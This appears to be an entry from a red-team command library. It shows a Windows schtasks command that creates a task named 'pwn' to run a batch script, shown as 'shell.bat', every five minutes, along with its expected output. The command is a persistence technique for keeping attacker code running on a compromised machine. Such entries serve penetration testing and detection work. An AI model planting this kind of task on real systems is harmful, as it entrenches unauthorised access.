---
id: cf7f541a-78ef-4bba-9e89-505717c4479f
name: Command Shell Scheduled Task Repeating Every 5 Minutes
type: command
executor: command_prompt
data: schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\$_PATH\$_SCRIPT.bat"
output: 'C:\>schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C ''C:\Windows\Tasks\shell.bat"

  SUCCESS: The scheduled task "pwn" has successfully been created.'
created_at: '2020-03-13T01:36:22.736727+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Command Shell Scheduled Task Repeating Every 5 Minutes

```command_prompt
schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\$_PATH\$_SCRIPT.bat"
```

## Expected Output

```
C:\>schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\Windows\Tasks\shell.bat"
SUCCESS: The scheduled task "pwn" has successfully been created.
```


